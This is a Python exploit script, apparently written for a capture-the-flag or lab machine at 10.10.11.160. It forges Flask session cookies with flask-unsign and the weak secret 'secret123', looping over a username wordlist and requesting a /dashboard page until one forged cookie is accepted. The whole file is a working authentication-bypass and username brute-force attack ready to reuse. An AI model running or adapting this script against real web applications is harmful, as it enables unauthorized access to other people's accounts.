import subprocess
import requests 
import traceback

def GenJwt():
    UserNamesWordlist = "/home/soliman/names2.txt"  # CHANGE ME: https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Usernames/Names/names.txt
    for userName in open(UserNamesWordlist):
        userName = userName.strip()
        command = [
            "flask-unsign",
            "--sign",
            "--cookie", f"{{'logged_in': True, 'username': '{userName}'}}",
            "--secret", "secret123"
        ]
        try:
            result = subprocess.check_output(command, text=True)
            jwt = result.strip()
            cookies = {"session": jwt}
            try: 
                r = requests.get("http://10.10.11.160:5000/dashboard", cookies=cookies)
                if r.status_code == 200 and "Welcome" in r.text:
                    print(f"[+] Username: {userName} whose JWT: {jwt} is a \033[92mVALID\033[0m user")
                    break
                print(f"[-] Username {userName} whose JWT {jwt} is \033[91mNOT VALID\033[0m")

            except Exception as e:
                print("[-] An Error occured: ", e)
                traceback.print_exc()

        except subprocess.CalledProcessError as e:
            print(f"[-] Error for {userName}: {e}")

def main():
    GenJwt()

if __name__ == "__main__":
    main()
